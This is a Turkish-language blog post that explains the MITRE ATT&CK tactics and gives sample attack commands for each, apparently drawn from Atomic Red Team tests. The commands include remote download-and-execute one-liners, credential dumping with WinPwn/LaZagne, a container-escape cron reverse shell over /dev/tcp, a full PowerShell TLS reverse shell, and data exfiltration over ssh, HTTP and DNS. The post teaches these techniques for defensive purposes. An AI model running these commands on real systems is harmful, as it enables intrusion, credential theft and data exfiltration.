---
title: "[TR] MITRE ATT&CK Framework"
date: 2023-12-05 11:23:00 +0800
categories: [Blue Team, MITRE ATTCK]
tags: [mitre, attack, framework]
author: adil_soybali
---

# MITRE

MITRE, 1958 yılında Amerika Birleşik Devletleri sponsorluğunda kurulan, akademik araştırmacılar ve endüstri arasında köprü görevi görmek ve soğuk savaş döneminde hava savunmasında önemli rol oynayan SAGE’yi geliştirmek amacıyla kurulan, kar amacı gütmeyen bir kuruluştur. Federal olarak finanse edilen 42 Ar-Ge merkezinin 6’sını yönetmektedir.

> Kısaca ABD ulusal güvenliğine hizmet eden, kar amacı gütmeyen, köklü ve büyük bir kuruluştur diyebiliriz.
> 

# MITRE ATT&CK Framework

Saldırganlar akıllıdır, ısrarcıdır, kolay adapte olurlar, başarılı veya başarısız denemelerden öğrenirler. Bilgi çalarlar, sistemlere ve şirketlere zarar verirler. Fakat saldırganlardan öğrenebileceğimiz çok şey var ve burada MITRE devreye giriyor. MITRE ATT&CK (Adversarial tactics, techniques, and common knowledge) global bir saldırgan davranışlarına ilişkin bilgileri barındıran frameworktür. ATT&CK, saldırganlar tarafından kullanılan taktikleri, teknikleri ve prosedürleri barındırır. Saldırganların hangi taktikleri, teknikleri, prosedürleri kullandığını ve davranışlarını kavramamız, onlara engel olmak için önemlidir. 

> Kısaca saldırganların kullandığı taktikleri, teknikleri ve prosedürleri barındıran frameworktür.
> 

# Taktik, Teknik, Alt Teknik

Taktikler, genel olarak saldırganların sistemlere sızma aşamasındaki motivasyonlarının genelleştirilmiş halidir. MITRE ATT&CK Frameworkünde 14 taktik vardır.

• Reconnaissance
• Resource Development
• Initial Access
• Execution
• Persistence
• Privilege Escalation
• Defense Evasion
• Credential Access
• Discovery
• Lateral Movement
• Collection
• Command and Control
• Exfiltration
• Impact

Bu taktiklerin içinde teknikler ve alt teknikler vardır. Teknikler, taktiğin amacını yerine getirmek için kullanılan yöntemlerdir. Alt teknikler ise tekniklerin alt kategorisidir.

Örneğin:

| Taktik | Teknik | Alt Teknik |
| --- | --- | --- |
| Reconnaissance (TA0043) | Active Scanning (T1595) | Scanning IP Blocks (T1595.001) |
| Discovery (TA0007) | Account Discovery (T1087) | Local Account (T1087.001) |

# Taktik, Teknik ve Saldırı Komutları

## Reconnaissance (T1595)

Saldırıyı planlamak, atak vektörünü genişletmek ve hedef hakkında bilgi toplamak için aktif veya pasif bilgi toplama işlemi yapılır. Bu tür bilgiler hedefin altyapısının veya personellerin ayrıntılarını içerebilir.

1. Active Scanning (T1595)
    
    Aktif tarama, doğrudan karşı sistem ile etkileşime geçerek yapılan taramalardır.
    
    1. Scanning IP Blocks (T1595.001)
        
        Örnek saldırı komutu:
        
        ```bash
        nmap -sP 192.168.10.0/24
        nmap -p- 192.168.10.0/24
        ```
        
    2. Vulnerability Scanning (T1595.002)
        
        Örnek saldırı komutu:
        
        ```bash
        nuclei -u http://192.168.10.1
        nmap -sS -sU -p- -pN -O --script all -sV --allports --version-all -T5 192.168.10.1
        ```
        
2. Gather Victim Host Information (T1592)
    
    Hedef sistem sunucuları hakkında bilgi toplama aşamasıdır. IP adresleri, işletim sistemleri vs. tespit edilir.
    
    1. Hardware (T1592.001)
        
        Örnek saldırı komutu:
        
        ```powershell
        Get-CimInstance -Query "SELECT * FROM Win32_PnPEntity WHERE (PNPClass = 'Image' OR PNPClass = 'Camera')"
        ```
        

---

## Resource Development (TA0042)

Saldırıyı desteklemek için gerekli kaynaklar oluşturulur. Bu tür kaynaklar arasında altyapı, hesaplar veya yetenekler yer alır. Bu kaynaklar, Komuta ve Kontrolü desteklemek için satın alınan domainleri, ilk Erişimin bir parçası olarak phishing için e-posta hesaplarını kullanmak veya defence evasiona yardımcı olmak için code sign sertifikalarını çalmak gibi saldırı yaşam döngüsünün diğer aşamalarına yardımcı olmak için saldırgan tarafından kullanılabilir.

1. Acquire Access (T1650)
2. Acquire Infrastructure (T1583)
3. Compromise Accounts (T1586)
4. Compromise Infrastructure (T1584)
5. Develop Capabilities (T1587)
6. Establish Accounts (T1585)
7. Obtain Capabilities (T1588)
8. Stage Capabilities (T1608)

## Initial Access (TA0001)

Hedef sisteme ilk erişimin kazanılır. Hedef sistemde yer edinmek için kullanılan teknikler arasında phishing ve public web sunucularındaki zafiyetlerden yararlanma yer alır.

1. Phishing (T1566)
    
    Phishing ile ilk erişim elde edilmeye çalışılır.
    
    1. Spearphishing Attachment (T1566.001)
        
        Örnek komut:
        
        ```powershell
        $url = 'https://adilsoybali.com/Dosya.xlsm'
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        Invoke-WebRequest -Uri $url -OutFile $env:TEMP\Dosya.xlsm
        ```
        
        ```powershell
        Remove-Item $env:TEMP\Dosya.xlsm -ErrorAction Ignore
        ```
        
2. Supply Chain Compromise (T1195)
    
    Ürün-hizmet teslim mekanizması manipule edilir.
    
    Örnek komut:
    
    ```powershell
    copy %temp%\ExplorerSync.db %temp%\..\Microsoft\ExplorerSync.db
    schtasks /create /tn ExplorerSync /tr "javaw -jar %temp%\..\Microsoft\ExplorerSync.db" /sc MINUTE /f
    ```
    
    ```powershell
    schtasks /delete /tn ExplorerSync /F 2>null
    del %temp%\..\Microsoft\ExplorerSync.db 2>null
    del %temp%\ExplorerSync.db 2>null
    ```
    
    ```powershell
    if (Test-Path #{rat_payload}) {exit 0} else {exit 1}
    Out-File -FilePath "#{rat_payload}"
    ```
    

---

## Execution (TA0002)

Local veya remote sistemde komut çalıştırılır. Zararlı kod çalıştıran teknikler genellikle bir ağı keşfetmek veya veri çalmak gibi daha geniş hedeflere ulaşmak için diğer tüm taktiklerdeki tekniklerle eşleştirilir.

1. Deploy Container (T1610)
    
    Örnek komut:
    
    ```bash
    docker build -t t1610 $Path/src/
    docker run --name t1610_container --rm -itd t1610 bash /tmp/script.sh
    ```
    
    ```bash
    docker stop t1610_container
    docker rmi -f t1610:latest
    ```
    
    ```bash
    if [ "" == "`which docker`" ]; then echo "Docker Not Found"; if [ -n "`which apt-get`" ]; then sudo apt-get -y install docker ; elif [ -n "`which yum`" ]; then sudo yum -y install docker ; fi ; else echo "Docker installed"; fi
    ```
    
    ```bash
    sudo systemctl start docker
    ```
    
2. Container Administration Command (T1609)
    
    Örnek komut:
    
    ```bash
    kubectl create -f #{path} -n #{namespace}
    # wait 3 seconds for the instance to come up
    sleep 3
    kubectl exec -n #{namespace} busybox -- #{command}
    ```
    
    ```bash
    kubectl delete pod busybox -n #{namespace}
    ```
    
    ```bash
    docker build -t t1609  $Folder/T1609/src/ 
    docker run --name t1609_container --rm -itd t1609 bash /tmp/script.sh
    docker exec -i t1609_container bash -c "cat /tmp/output.txt"
    ```
    
3. System Services (T1569)
    
    Sistem servisleri kullanılarak komut çalıştırılır.
    
    1. Launchctl (T1569.001)
        
        Örnek komut:
        
        ```bash
        launchctl submit -l #{label_name} -- #{executable_path}
        ```
        
        ```bash
        launchctl remove #{label_name}
        ```
        
    2. Service Execution (T1569.002)
        
        ```bash
        sc.exe create #{service_name} binPath= "#{executable_command}"
        sc.exe start #{service_name}
        sc.exe delete #{service_name}
        ```
        
        ```bash
        "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" \\#{remote_host} -u #{user_name} -p #{password} -accepteula "C:\Windows\System32\calc.exe"
        ```
        
        ```bash
        New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
        Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip"
        Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip" "PathToAtomicsFolder\..\ExternalPayloads\PsTools" -Force
        Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\PsTools\PsExec.exe" "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" -Force
        ```
        
        ```bash
        psexec.py '#{domain}/#{username}:#{password}@#{remote_host}' '#{command}'
        ```
        

---

## Persistence (TA0003)

Sistemde kalıcı olunur. Kalıcılık, sistemlerin yeniden başlatmalarına karşı, değişen kimlik bilgileri veya erişimleri kesebilecek diğer kesintiler karşısında sistemlere erişimlerini sürdürmek için kullandıkları tekniklerden oluşur.

1. Event Triggered Execution (T1546)
    
    Örnek komut:
    
    ```powershell
    Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters -Name AutodialDLL -Value PathToAtomicsFolder\T1546\bin\AltWinSock2DLL.dll
    ```
    
    ```powershell
    Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters -Name AutodialDLL -Value  $env:windir\system32\rasadhlp.dll
    ```
    
    ```powershell
    New-Item -Type Directory "Path\T1546\bin\" -ErrorAction ignore | Out-Null
    Invoke-WebRequest "https://adilsoybali.com/T1546/bin/AltWinSock2DLL.dll" -OutFile "Path\T1546\bin\AltWinSock2DLL.dll"
    ```
    
    ```powershell
    New-ItemProperty -Path "HKLM:\Software\Microsoft\Command Processor" -Name "AutoRun" -Value "#{command}" -PropertyType "String"
    ```
    
2. Office Application Startup (T1137)
    
    Örnek komut:
    
    ```powershell
    reg add "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security\Level" /t REG_DWORD /d 1 /f
    mkdir  %APPDATA%\Microsoft\Outlook\ >nul 2>&1
    echo "TEST" > %APPDATA%\Microsoft\Outlook\VbaProject.OTM
    ```
    
    ```powershell
    reg delete "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security\Level" /f >nul 2>&1
    del %APPDATA%\Microsoft\Outlook\VbaProject.OTM >nul 2>&1
    ```
    

---

## Privilege Escalation (TA0004)

Yetki yükseltilir. Yetki yükseltme, saldırganların bir sistem veya ağ üzerinde daha üst düzey izinler elde etmek için kullandıkları tekniklerden oluşur. Saldırganlar genellikle yetkisiz erişimle bir ağa girebilir ve ağı keşfedebilir, ancak hedeflerini gerçekleştirmek için daha fazla izinlere ihtiyaç duyarlar.

1. Escape to Host (T1611)
    
    Örnek komut:
    
    ```bash
    kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=Never -ti --rm --image alpine --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"securityContext":{"privileged":true}}]}}'
    ```
    
    ```bash
    if [ "" == "`which docker`" ]; then echo "Docker Not Found"; if [ -n "`which apt-get`" ]; then sudo apt-get -y install docker ; elif [ -n "`which yum`" ]; then sudo yum -y install docker ; fi ; else echo "Docker installed"; fi
    ```
    
    ```bash
    sudo systemctl start docker
    ```
    
    ```bash
    if [ ! -d #{mount_point} ]; then mkdir #{mount_point} ; mount #{mount_device} #{mount_point}; fi
    echo -n "* * * * * root /bin/bash -c '/bin/bash -c echo \"\"; echo \"hello from host! " > #{mount_point}#{cron_path}/#{cron_filename}
    echo -n "$" >> #{mount_point}#{cron_path}/#{cron_filename}
    echo -n "(hostname) " >> #{mount_point}#{cron_path}/#{cron_filename}
    echo -n "$" >> #{mount_point}#{cron_path}/#{cron_filename}
    echo "(id)\" >& /dev/tcp/#{listen_address}/#{listen_port} 0>&1'" >> #{mount_point}#{cron_path}/#{cron_filename}
    netcat -l -p #{listen_port} 2>&1
    ```
    
    ```bash
    if [ "" == "`which mount`" ]; then echo "mount Not Found"; if [ -n "`which apt-get`" ]; then sudo apt-get -y install mount ; elif [ -n "`which yum`" ]; then sudo yum -y install mount ; fi ; else echo "mount installed"; fi
    ```
    
    ```bash
    capsh --print | grep cap_sys_admin
    ```
    
    ```bash
    if [ "`capsh --print | grep cap_sys_admin`" == "" ]; then echo "Container not privileged.  Re-start container in insecure state.  Docker: run with --privileged flag.  Kubectl, add securityContext: privileged: true"; fi
    ```
    
2. Boot or Logon Autostart Execution (T1547)
    
    Örnek komut:
    
    ```bash
    pnputil.exe /add-driver "#{driver_inf}"
    ```
    

---

## Defense Evasion (TA0005)

Savunma sistemlerinden kaçılır, tespit edilememek amaçlanır. Savunmadan kaçınma için kullanılan teknikler arasında güvenlik yazılımının kaldırılması/devre dışı bırakılması veya veri ve komut dosyalarının gizlenmesi/şifrelenmesi yer alır. Saldırganlar ayrıca kötü amaçlı yazılımlarını gizlemek ve maskelemek için güvenilir olarak tanımlanan süreçlerden yararlanır ve bunları kötüye kullanır.

1. Plist File Modification (T1647)
    
    Örnek komut:
    
    ```bash
    nano ~/Library/Preferences/com.apple.dock.plist
    vim ~/Library/Preferences/com.apple.dock.plist
    ```
    
2. Reflective Code Loading (T1620)
    
    Örnek komut:
    
    ```bash
    $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
    iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
    mimiload -consoleoutput -noninteractive
    ```
    
3. Indirect Command Execution (T1202)
    
    Örnek komut:
    
    ```bash
    pcalua.exe -a #{process}
    pcalua.exe -a #{payload_path}
    ```
    
    ```bash
    forfiles /p c:\windows\system32 /m notepad.exe /c #{process}
    ```
    
    ```bash
    conhost.exe "#{process}"
    ```
    

---

## Credential Access (TA0006)

Kullanıcı adları ve parolaları ele geçirilir. Kimlik bilgilerini elde etmek için kullanılan teknikler arasında keylogging veya credential dumping yer alır. Yetkili kullanıcıların bilgilerini kullanmak, saldırganlara sistemlere erişim sağlayabilir, tespit edilmelerini zorlaştırabilir ve hedeflerine ulaşmalarına yardımcı olmak için daha fazla hesap oluşturma fırsatı sağlayabilir.

1. Steal or Forge Authentication Certificates (T1649)
    
    Örnek komut:
    
    ```powershell
    $archive="$env:PUBLIC\certs.zip"
    $exfilpath="$env:PUBLIC\certs"
    Add-Type -assembly "system.io.compression.filesystem"
    Remove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore
    mkdir $exfilpath | Out-Null
    foreach ($cert in (gci Cert:\CurrentUser\My)) { Export-Certificate -Cert $cert -FilePath $exfilpath\$($cert.FriendlyName).cer}
    [io.compression.zipfile]::CreateFromDirectory($exfilpath, $archive)
    ```
    
2. Credentials from Password Stores (T1555)
    
    Örnek komut:
    
    ```powershell
    IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force
    ```
    
    ```powershell
    IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force
    ```
    
    ```powershell
    $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
    iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
    lazagnemodule -consoleoutput -noninteractive
    ```
    

---

## Discovery (TA0007)

Erişilen sistem ve local ağda keşif yapılır. Keşif, saldırganın sistem ve iç ağ hakkında bilgi edinmek için kullanabileceği tekniklerden oluşur. Bu teknikler, düşmanların nasıl hareket edeceklerine karar vermeden önce ortamı gözlemlemelerine ve kendilerini yönlendirmelerine yardımcı olur. Ayrıca düşmanların neleri kontrol edebileceklerini ve giriş noktalarının etrafında neler olduğunu keşfederek mevcut hedeflerine nasıl fayda sağlayabileceklerini keşfetmelerini sağlar.

1. Cloud Storage Object Discovery (T1619)
    
    Örnek komut:
    
    ```bash
    for bucket in "$(aws s3 ls | cut -d " " -f3)"; do aws s3api list-objects-v2 --bucket $bucket --output text; done
    ```
    
2. Group Policy Discovery (T1615)
    
    Örnek komut:
    
    ```bash
    gpresult /z
    ```
    
    ```bash
    powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO"
    ```
    
    ```bash
    $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
    iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
    GPOAudit -noninteractive -consoleoutput
    ```
    
3. Software Discovery (T1518)
    
    Örnek komut:
    
    ```powershell
    reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer" /v svcVersion
    ```
    
    ```powershell
    Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize
    Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize
    ```
    

---

## Lateral Movement (TA0008)

Yatay yayılım yapılır. Yatay yayılım, düşmanların bir ağ üzerindeki uzak sistemlere girmek ve bunları kontrol etmek için kullandıkları tekniklerden oluşur. Birincil hedeflerini takip etmek genellikle hedeflerini bulmak için ağı keşfetmeyi ve ardından ona erişim sağlamayı gerektirir. Hedefe ulaşmak için genellikle birden fazla sistem ve hesap arasında geçiş yapmak gerekir. Saldırganlar yatay yayılımı gerçekleştirmek için kendi uzaktan erişim araçlarını yükleyebilir veya daha gizli olabilen yerel ağ ve işletim sistemi araçlarıyla önceden elde ettiği kimlik bilgilerini kullanabilir.

1. Lateral Tool Transfer (T1570)
    
    Örnek komut:
    
    ```powershell
    New-SmbMapping -RemotePath '#{remote_path}' -TransportType QUIC -SkipCertificateCheck
    copy '#{local_file}' 'Z:\'
    ```
    
    ```powershell
    NET USE * '#{remote_path}' /TRANSPORT:QUIC /SKIPCERTCHECK
    copy '#{local_file}' '*:\'
    ```
    
2. Software Deployment Tools (T1072)
    
    ```powershell
    "%PROGRAMFILES(x86)%/#{radmin_exe}"
    ```
    
    ```powershell
    "%PROGRAMFILES(x86)%/#{PDQ_Deploy_exe}"
    ```
    

---

## Collection (TA0009)

Datalar toplanır. Toplama adımı, saldırganların bilgi toplamak için kullanabileceği tekniklerden ve saldırganın hedeflerini takip etmekle ilgili bilgilerin toplandığı kaynaklardan oluşur. Sıklıkla, veri topladıktan sonraki hedef veriyi çalmak/çıkarmaktır (exfiltrate). Hedefler arasında çeşitli sürücü türleri, tarayıcılar, ses, video ve e-postalar yer alır. Ekran görüntülerini ve klavye girişleri yakalanabilir.

1. Video Capture (T1125)
    
    Örnek komut:
    
    ```powershell
    reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f
    reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f
    
    reg DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam\NonPackaged\C:#Windows#Temp#atomic.exe /f
    ```
    
2. Audio Capture (T1123)
    
    Örnek komut:
    
    ```powershell
    powershell.exe -Command WindowsAudioDevice-Powershell-Cmdlet
    ```
    
3. Automated Collection (T1119)
    
    Örnek komut:
    
    ```powershell
    mkdir %temp%\T1119_command_prompt_collection >nul 2>&1
    dir c: /b /s .docx | findstr /e .docx
    for /R c:\ %f in (*.docx) do copy /Y %f %temp%\T1119_command_prompt_collection
    
    del %temp%\T1119_command_prompt_collection /F /Q >nul 2>&1
    ```
    
    ```powershell
    New-Item -Path $env:TEMP\T1119_powershell_collection -ItemType Directory -Force | Out-Null
    Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP\T1119_powershell_collection}
    
    Remove-Item $env:TEMP\T1119_powershell_collection -Force -ErrorAction Ignore | Out-Null
    ```
    
    ```powershell
    sc query type=service > %TEMP%\T1119_1.txt
    doskey /history > %TEMP%\T1119_2.txt
    wmic process list > %TEMP%\T1119_3.txt
    tree C:\AtomicRedTeam\atomics > %TEMP%\T1119_4.txt
    ```
    
4. Data from Local System (T1005)
    
    Örnek komut:
    
    ```powershell
    $startingDirectory = "#{starting_directory}"
    $outputZip = "#{output_zip_folder_path}"
    $fileExtensionsString = "#{file_extensions}" 
    $fileExtensions = $fileExtensionsString -split ", "
    
    New-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null
    
    Function Search-Files {
      param (
        [string]$directory
      )
      $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {
        $fileExtensions -contains $_.Extension.ToLower()
      }
      return $files
    }
    
    $foundFiles = Search-Files -directory $startingDirectory
    if ($foundFiles.Count -gt 0) {
      $foundFilePaths = $foundFiles.FullName
      Compress-Archive -Path $foundFilePaths -DestinationPath "$outputZip\data.zip"
    
      Write-Host "Zip file created: $outputZip\data.zip"
      } else {
          Write-Host "No files found with the specified extensions."
      }
    ```
    

---

## Command and Control (TA0011)

Ele geçirilen sistemler kontrol edilir. Komuta kontrol, saldırganın, hedefin ağı içinde kendi kontrolleri altındaki sistemlerle iletişim kurmak için kullanabilecekleri tekniklerden oluşur. Saldırganlar genellikle tespit edilmekten kaçınmak için normal, beklenen trafiği taklit etmeye çalışırlar. Bir saldırganın, hedef ağ yapısına ve savunmasına bağlı olarak çeşitli gizlilik seviyelerinde komuta kontrol kurabileceği birçok yol vardır.

1. Encrypted Channel (T1573)
    
    Örnek komut:
    
    ```powershell
    $server_ip = #{server_ip}
    $server_port = #{server_port}
    $socket = New-Object Net.Sockets.TcpClient('#{server_ip}', '#{server_port}')
    $stream = $socket.GetStream()
    $sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
    $sslStream.AuthenticateAsClient('fakedomain.example', $null, "Tls12", $false)
    $writer = new-object System.IO.StreamWriter($sslStream)
    $writer.Write('PS ' + (pwd).Path + '> ')
    $writer.flush()
    [byte[]]$bytes = 0..65535|%{0};
    while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)
    {$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data | Out-String ) 2>&1;
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}
    ```
    
2. Protocol Tunneling (T1572)
    
    Örnek komut:
    
    ```powershell
    for($i=0; $i -le #{query_volume}; $i++) { (Invoke-WebRequest "#{doh_server}?name=#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}&type=#{query_type}" -UseBasicParsing).Content }
    ```
    
    ```powershell
    Set-Location "PathToAtomicsFolder"
    .\T1572\src\T1572-doh-beacon.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}
    ```
    
    ```powershell
    Set-Location "PathToAtomicsFolder"
    .\T1572\src\T1572-doh-domain-length.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}
    ```
    
    ```powershell
    C:\Users\Public\ngrok\ngrok.exe config add-authtoken #{api_token} | Out-Null
    Start-Job -ScriptBlock { C:\Users\Public\ngrok\ngrok.exe tcp #{port_num} } | Out-Null
    Start-Sleep -s 5 
    Stop-Job -Name Job1 | Out-Null
    ```
    
3. Non-Standard Port (T1571)
    
    Örnek komut:
    
    ```powershell
    Test-NetConnection -ComputerName #{domain} -port #{port}
    ```
    
    ```powershell
    echo quit | telnet #{domain} #{port}
    exit 0
    ```
    
4. Remote Access Software (T1219)
    
    Örnek komut:
    
    ```powershell
    Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe
    $file1 = "C:\Users\" + $env:username + "\Desktop\TeamViewer_Setup.exe"
    Start-Process -Wait $file1 /S; 
    Start-Process 'C:\Program Files (x86)\TeamViewer\TeamViewer.exe'
    ```
    
    ```powershell
    Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe
    $file1 = "C:\Users\" + $env:username + "\Desktop\AnyDesk.exe"
    Start-Process $file1 /S;
    ```
    
    ```powershell
    Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi
    $file1 = "C:\Users\" + $env:username + "\Desktop\LogMeInIgnition.msi"
    Start-Process -Wait $file1 /quiet;
    Start-Process 'C:\Program Files (x86)\LogMeIn Ignition\LMIIgnition.exe' "/S"
    ```
    
    ```powershell
    Invoke-WebRequest -OutFile C:\Users\$env:username\Downloads\GoToAssist.exe "https://launch.getgo.com/launcher2/helper?token=e0-FaCddxmtMoX8_cY4czssnTeGvy83ihp8CLREfvwQshiBW0_RcbdoaEp8IA-Qn8wpbKlpGIflS-39gW6RuWRM-XHwtkRVMLBsp5RSKp-a3PBM-Pb1Fliy73EDgoaxr-q83WtXbLKqD7-u3cfDl9gKsymmhdkTGsXcDXir90NqKj92LsN_KpyYwV06lIxsdRekhNZjNwhkWrBa_hG8RQJqWSGk6tkZLVMuMufmn37eC2Cqqiwq5bCGnH5dYiSUUsklSedRLjh4N46qPYT1bAU0qD25ZPr-Kvf4Kzu9bT02q3Yntj02ZA99TxL2-SKzgryizoopBPg4Ilfo5t78UxKTYeEwo4etQECfkCRvenkTRlIHmowdbd88zz7NiccXnbHJZehgs6_-JSVjQIdPTXZbF9T5z44mi4BQYMtZAS3DE86F0C3D4Tcd7fa5F6Ve8rQWt7pvqFCYyiJAailslxOw0LsGyFokoy65tMF980ReP8zhVcTKYP8s8mhGXihUQJQPNk20Sw&downloadTrigger=restart&renameFile=1"
    $file1 = "C:\Users\" + $env:username + "\Downloads\GoToAssist.exe"
    Start-Process $file1 /S;
    ```
    
    ```powershell
    $installer = "C:\Users\$env:username\Downloads\ScreenConnect.msi"
    Invoke-WebRequest -OutFile $installer "https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_21.11.4237.7885_Release.msi"
    msiexec /i $installer /qn
    ```
    

---

## Exfiltration (TA0010)

Datalar sızdırılır. Hedefin ağdan veri çalmak için kullanabileceği tekniklerden oluşur. Verileri hedef ağdan çıkarma teknikleri genellikle komuta kontrol kanalları veya alternatif bir kanal üzerinden aktarmayı içerir ve ayrıca aktarıma boyut sınırları koymayı da içerebilir.

1. Exfiltration Over Alternative Protocol (T1048)
    
    Örnek komut:
    
    ```bash
    ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
    ```
    
    ```bash
    tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@#{domain} 'cat > /Users.tar.gz.enc'
    ```
    
    ```powershell
    Import-Module "#{ps_module}"
    Invoke-DNSExfiltrator -i "#{ps_module}" -d #{domain} -p #{password} -doh #{doh} -t #{time} #{encoding}
    ```
    
2. Exfiltration Over C2 Channel (T1041)
    
    Örnek komut:
    
    ```powershell
    if(-not (Test-Path #{filepath})){ 
      1..100 | ForEach-Object { Add-Content -Path #{filepath} -Value "This is line $_." }
    }
    [System.Net.ServicePointManager]::Expect100Continue = $false
    $filecontent = Get-Content -Path #{filepath}
    Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $filecontent -DisableKeepAlive
    ```
    
3. Data Transfer Size Limits (T1030)
    
    Örnek komut:
    
    ```bash
    cd #{folder_path}; split -b 5000000 #{file_name}
    ls -l #{folder_path}
    ```
    
4. Automated Exfiltration (T1020)
    
    Örnek komut:
    
    ```powershell
    $fileName = "#{file}"
    $url = "https://adilsoybali.com"
    $file = New-Item -Force $fileName -Value "This is ART IcedID Botnet Exfil Test"
    $contentType = "application/octet-stream"
    try {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}
    ```
    

---

## Impact (TA0040)

Veriler manipule edilir, sistem kesintiye uğratılır veya yok edilir. Kullanılan teknikler arasında verilerin yok edilmesi veya bozulması yer alabilir. Bazı durumlarda iş süreçleri iyi görünebilir ancak saldırganların hedeflerine fayda sağlayacak şekilde değiştirilmiş olabilir. Bu teknikler, saldırganlar tarafından nihai hedeflerine ulaşmak için veya bir gizlilik ihlaline karşı koruma sağlamak için kullanılabilir.

1. Account Access Removal (T1531)
    
    Örnek komut:
    
    ```powershell
    net user #{user_account} #{new_user_password} /add
    net.exe user #{user_account} #{new_password}
    ```
    
    ```powershell
    net user #{user_account} #{new_user_password} /add
    net.exe user #{user_account} /delete
    ```
    
    ```powershell
    $PWord = ConvertTo-SecureString -String #{super_pass} -AsPlainText -Force
    $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList #{super_user}, $PWord
    if((Get-ADUser #{remove_user} -Properties memberof).memberof -like "CN=Domain Admins*"){
      Remove-ADGroupMember -Identity "Domain Admins" -Members #{remove_user} -Credential $Credential -Confirm:$False
    } else{
        write-host "Error - Make sure #{remove_user} is in the domain admins group" -foregroundcolor Red
    }
    ```
    
2. System Shutdown/Reboot (T1529)
    
    Örnek komut:
    
    ```powershell
    shutdown /s /t #{timeout}
    shutdown -r #{timeout}
    shutdown /r /t #{timeout}
    shutdown -h #{timeout}
